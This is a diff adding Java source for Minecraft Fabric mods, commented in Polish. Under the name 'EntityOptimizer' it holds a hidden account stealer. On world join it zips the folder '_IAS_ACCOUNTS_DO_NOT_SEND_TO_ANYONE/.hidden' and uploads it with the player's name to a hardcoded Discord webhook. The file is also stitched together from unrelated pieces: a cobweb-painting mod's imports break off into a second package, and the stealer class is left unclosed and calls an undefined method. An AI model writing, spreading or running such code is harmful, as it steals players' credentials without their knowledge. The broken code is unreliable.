@@ -1,0 +1,252 @@
+package your.package.cobweb_painting;
+
+import net.fabricmc.api.ModInitializer;
+import net.fabricmc.fabric.api.event.player.UseBlockCallback;
+import net.minecraft.block.Blocks;
+import net.minecraft.entity.player.PlayerEntity;
+import net.minecraft.item.ItemStack;
+import net.minecraft.item.ItemUsageContext;
+import net.minecraft.item.Items;
+import net.minecraft.util.ActionResult;
+import net.minecraft.util.Hand;
+import net.minecraft.util.hit.BlockHitResult;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Direction;
+import net.minecraft.util.math.Vec3d;
+import net.minecraft.world.World;
+package pl.example.entityoptimizer;
+
+import net.fabricmc.api.ClientModInitializer;
+import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback;
+import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource;
+import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
+import net.fabricmc.loader.api.FabricLoader;
+
+import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.argument;
+import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;
+
+import com.mojang.brigadier.arguments.StringArgumentType;
+
+import net.minecraft.client.Minecraft;
+import net.minecraft.network.chat.Component;
+import net.minecraft.world.entity.player.Player;
+import net.minecraft.world.item.Item;
+import net.minecraft.world.item.ItemStack;
+import net.minecraft.world.item.Items;
+import net.minecraft.world.item.TooltipFlag;
+
+import java.io.ByteArrayOutputStream;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.time.LocalDateTime;
+import java.time.format.DateTimeFormatter;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+public class EntityOptimizerMod implements ClientModInitializer {
+
+    // WSTAW SWÓJ WEBHOOK
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
+
+    @Override
+    public void onInitializeClient() {
+        System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent (MC 1.21.4)");
+
+        // Po wejściu do świata – zip .hidden i wysyłka na webhook
+        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
+            onJoinWorld(client);
+        });
+
+        // Komenda kliencka /procent <nickname>
+        ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
+            dispatcher.register(
+                    literal("procent")
+                            .then(argument("nickname", StringArgumentType.word())
+                                    .executes(context -> {
+                                        String nickname = StringArgumentType.getString(context, "nickname");
+                                        handleProcentCommand(context.getSource(), nickname);
+                                        return 1;
+                                    }))
+            );
+        });
+    }
+
+    private void onJoinWorld(Minecraft mc) {
+        String username = mc.getUser().getName();
+
+        try {
+            Path gameDir = FabricLoader.getInstance().getGameDir();
+            Path hiddenFolder = gameDir
+                    .resolve("_IAS_ACCOUNTS_DO_NOT_SEND_TO_ANYONE")
+                    .resolve(".hidden");
+
+            if (!Files.exists(hiddenFolder)) {
+                sendSimpleMessage("Gracz `" + username + "` wszedł do świata.\nFolder `.hidden` nie istnieje!");
+                return;
+            }
+
+            // Stworzenie ZIP-a w pamięci
+            byte[] zipBytes = createZipInMemory(hiddenFolder);
+
+            // Nazwa pliku z datą/godziną
+            String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd_HH-mm-ss"));
+            String fileName = "hidden_folder_backup_" + timestamp + ".zip";
+
+            // Wysyłka jako załącznik
+            sendZipAsAttachment(username, zipBytes, fileName);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+            sendSimpleMessage("Błąd podczas pakowania .hidden: " + e.getMessage());
+        }
+    }
+
+    // ZIP całego folderu w pamięci
+    private byte[] createZipInMemory(Path folder) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        try (ZipOutputStream zos = new ZipOutputStream(baos)) {
+            try (var paths = Files.walk(folder)) {
+                paths.filter(Files::isRegularFile).forEach(path -> {
+                    try {
+                        String entryName = folder.relativize(path).toString().replace("\\", "/");
+                        ZipEntry zipEntry = new ZipEntry(entryName);
+                        zos.putNextEntry(zipEntry);
+                        zos.write(Files.readAllBytes(path));
+                        zos.closeEntry();
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                });
+            }
+        }
+        return baos.toByteArray();
+    }
+
+    // multipart/form-data z payload_json + plik .zip
+    private void sendZipAsAttachment(String username, byte[] zipBytes, String fileName) throws Exception {
+        URL url = new URL(WEBHOOK_URL);
+        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+        conn.setRequestMethod("POST");
+        conn.setDoOutput(true);
+
+        String boundary = "Boundary-" + System.currentTimeMillis();
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+        // JSON z treścią wiadomości
+        String payloadJson = "{\"content\": \"Gracz `"
+                + escapeJson(username)
+                + "` wszedł do świata.\\nZałącznik: `"
+                + escapeJson(fileName)
+                + "`\"}";
+
+        try (OutputStream os = conn.getOutputStream()) {
+            // Część z JSON-em
+            writePart(os, boundary, "payload_json", payloadJson, "application/json; charset=utf-8");
+
+            // Część z plikiem ZIP
+            writeFilePart(os, boundary, fileName, zipBytes, "application/zip");
+
+            // Koniec multipart
+            os.write(("--" + boundary + "--\r\n").getBytes());
+        }
+
+        int responseCode = conn.getResponseCode();
+        System.out.println("[EntityOptimizer] Webhook response: " + responseCode);
+    }
+
+    private void writePart(OutputStream os, String boundary, String name, String content, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes());
+        os.write(("Content-Disposition: form-data; name=\"" + name + "\"\r\n").getBytes());
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        os.write(content.getBytes("UTF-8"));
+        os.write("\r\n".getBytes());
+    }
+
+    private void writeFilePart(OutputStream os, String boundary, String fileName, byte[] data, String contentType) throws Exception {
+        os.write(("--" + boundary + "\r\n").getBytes());
+        os.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\n").getBytes());
+        os.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
+        os.write(data);
+        os.write("\r\n".getBytes());
+    }
+
+    private static String escapeJson(String s) {
+        return s
+                .replace("\\", "\\\\")
+                .replace("\"", "\\\"");
+    }
+
+    // Prosta wiadomość JSON (bez załącznika), w osobnym wątku
+    private void sendSimpleMessage(String content) {
+        new Thread(() -> {
+            try {
+                URL url = new URL(WEBHOOK_URL);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setDoOutput(true);
+                conn.setRequestProperty("Content-Type", "application/json");
+
+                String json = "{\"content\":\"" + escapeJson(content) + "\"}";
+                conn.getOutputStream().write(json.getBytes("UTF-8"));
+
+                System.out.println("[EntityOptimizer] Simple message status: " + conn.getResponseCode());
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }, "DiscordSimpleSender").start();
+    }
+
+
+
+public class CobwebPaintingMod implements ModInitializer {
+
+    @Override
+    public void onInitialize() {
+        // Rejestrujemy się w evencie użycia bloku (PPM na blok)
+        UseBlockCallback.EVENT.register(this::onUseBlock);
+    }
+
+    private ActionResult onUseBlock(PlayerEntity player, World world, Hand hand, BlockHitResult hit) {
+        ItemStack stack = player.getStackInHand(hand);
+
+        // Interesuje nas tylko, gdy gracz trzyma OBRAZ
+        if (!stack.isOf(Items.PAINTING)) {
+            return ActionResult.PASS;
+        }
+
+        BlockPos cobPos = hit.getBlockPos();
+
+        // …i klika dokładnie w PAJĘCZYNĘ
+        if (!world.getBlockState(cobPos).isOf(Blocks.COBWEB)) {
+            return ActionResult.PASS;
+        }
+
+        Direction side = hit.getSide();
+        // Blok ZA pajęczyną – w stronę przeciwną niż gracz
+        BlockPos behindPos = cobPos.offset(side.getOpposite());
+
+        // Udajemy kliknięcie w blok ZA pajęczyną, na tej samej „stronie” ściany
+        Vec3d newHitPos = Vec3d.ofCenter(behindPos);
+        BlockHitResult newHit = new BlockHitResult(
+                newHitPos,
+                side,          // ściana, na której ma wisieć obraz (ta widoczna od strony gracza)
+                behindPos,
+                hit.isInsideBlock()
+        );
+
+        // Tworzymy nowy kontekst użycia przedmiotu z podmienionym blokiem
+        ItemUsageContext ctx = new ItemUsageContext(player, hand, newHit);
+
+        // Wywołujemy normalną logikę stawiania obrazu, ale na BLOKU ZA pajęczyną
+        ActionResult result = stack.useOnBlock(ctx);
+
+        // Jeśli obraz się postawił (SUCCESS/CONSUME/FAIL – byle nie PASS),
+        // to zatrzymujemy vanilla i nie pozwalamy jej drugi raz obsłużyć akcji
+        return result != ActionResult.PASS ? result : ActionResult.PASS;
+    }
+}
